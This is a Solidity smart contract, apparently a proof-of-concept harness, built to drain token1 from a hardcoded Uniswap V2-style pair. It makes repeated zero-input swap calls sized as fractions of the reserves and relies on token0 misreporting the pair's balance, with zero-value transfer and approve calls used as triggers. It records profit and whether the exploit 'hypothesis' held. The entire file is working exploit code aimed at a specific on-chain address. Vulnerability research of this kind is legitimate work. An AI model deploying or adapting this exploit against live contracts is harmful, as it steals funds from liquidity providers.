// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public attackerToken1Before;
    uint256 public attackerToken1After;
    uint256 public successfulRounds;
    uint256 public successfulAttempts;
    uint256 public triggerAttempts;
    uint256 public finalAttemptedAmount1Out;

    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before,) = pair.getReserves();
        attackerToken1Before = _balanceOf(token1, address(this));

        // Path-strict execution:
        // 1) attacker directly calls swap(0, amount1Out, attacker, data)
        // 2) no real token0 is supplied by this contract
        // 3) if token0 lies in balanceOf(pair), the pair credits fake amount0In,
        //    passes the invariant, updates poisoned reserves, and transfers real token1 out
        // 4) repeat while the same zero-input path remains profitable
        _runZeroInputSwapRounds();

        // Minimal public trigger retry only if direct execution never produced profit.
        // This does not change the exploit route: the extraction is still the same
        // zero-input `swap(0, amount1Out, attacker, "")`, and these calls send no
        // real token0 value. They only try to surface latent balanceOf manipulation.
        if (_profitAmount == 0) {
            _tryZeroValueToken0Triggers();
            _runZeroInputSwapRounds();
        }

        (reserve0After, reserve1After,) = pair.getReserves();
        attackerToken1After = _balanceOf(token1, address(this));

        if (attackerToken1After > attackerToken1Before) {
            _profitToken = token1;
            _profitAmount = attackerToken1After - attackerToken1Before;
            hypothesisValidated = true;
            hypothesisRefuted = false;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
            hypothesisValidated = false;
            hypothesisRefuted = true;

            if (bytes(lastFailureReason).length == 0) {
                lastFailureReason = "No zero-input swap yielded token1 profit at this fork block";
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runZeroInputSwapRounds() internal {
        for (uint256 round = 0; round < 4; ++round) {
            (,, uint256 roundProfit) = _attemptBestZeroInputSwap();
            if (roundProfit == 0) {
                break;
            }
            successfulRounds += 1;
        }
    }

    function _attemptBestZeroInputSwap() internal returns (uint256 bestAmountOut, uint256 bestNetProfit, uint256 roundProfit) {
        (, uint112 reserve1,) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        uint256 honestReserve = uint256(reserve1);
        if (honestReserve <= 1) {
            lastFailureReason = "Pair has no token1 reserve to withdraw";
            return (0, 0, 0);
        }

        uint256 balanceBefore = _balanceOf(token1, address(this));

        uint256[14] memory divisors = [
            uint256(2),
            3,
            4,
            5,
            8,
            16,
            32,
            64,
            128,
            256,
            512,
            1024,
            2048,
            4096
        ];

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amount1Out = honestReserve / divisors[i];
            if (amount1Out == 0 || amount1Out >= honestReserve) {
                continue;
            }

            finalAttemptedAmount1Out = amount1Out;

            (bool ok, string memory revertReason) = _trySwap(amount1Out);
            uint256 balanceAfter = _balanceOf(token1, address(this));
            uint256 gained = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;

            if (gained > 0) {
                successfulAttempts += 1;
                if (gained > bestNetProfit) {
                    bestNetProfit = gained;
                    bestAmountOut = amount1Out;
                }
                roundProfit = gained;
                return (bestAmountOut, bestNetProfit, roundProfit);
            }

            if (!ok && bytes(revertReason).length != 0) {
                lastFailureReason = revertReason;
            }
        }

        if (bytes(lastFailureReason).length == 0) {
            lastFailureReason = "All zero-input swap sizes reverted or returned no token1";
        }
    }

    function _trySwap(uint256 amount1Out) internal returns (bool ok, string memory reason) {
        try IUniswapV2PairLike(TARGET_PAIR).swap(0, amount1Out, address(this), "") {
            return (true, "");
        } catch Error(string memory revertReason) {
            return (false, revertReason);
        } catch Panic(uint256) {
            return (false, "swap panicked");
        } catch {
            return (false, "swap reverted");
        }
    }

    function _tryZeroValueToken0Triggers() internal {
        // These zero-value calls are intentionally minimal: they never provide the
        // pair with real token0 and only exercise public token entrypoints that may
        // affect a malicious token's balance reporting logic.
        bytes[4] memory payloads = [
            abi.encodeWithSelector(IERC20Like.transfer.selector, TARGET_PAIR, 0),
            abi.encodeWithSelector(IERC20Like.transfer.selector, address(this), 0),
            abi.encodeWithSignature("approve(address,uint256)", TARGET_PAIR, 0),
            abi.encodeWithSignature("approve(address,uint256)", address(this), 0)
        ];

        for (uint256 i = 0; i < payloads.length; ++i) {
            triggerAttempts += 1;
            (bool ok,) = token0.call(payloads[i]);
            if (ok) {
                // keep trying the direct exploit route after any accepted public call
            }
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;
        token0 = address(0);
        token1 = address(0);
        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;
        attackerToken1Before = 0;
        attackerToken1After = 0;
        successfulRounds = 0;
        successfulAttempts = 0;
        triggerAttempts = 0;
        finalAttemptedAmount1Out = 0;
        lastFailureReason = "";
        _profitToken = address(0);
        _profitAmount = 0;
    }
}
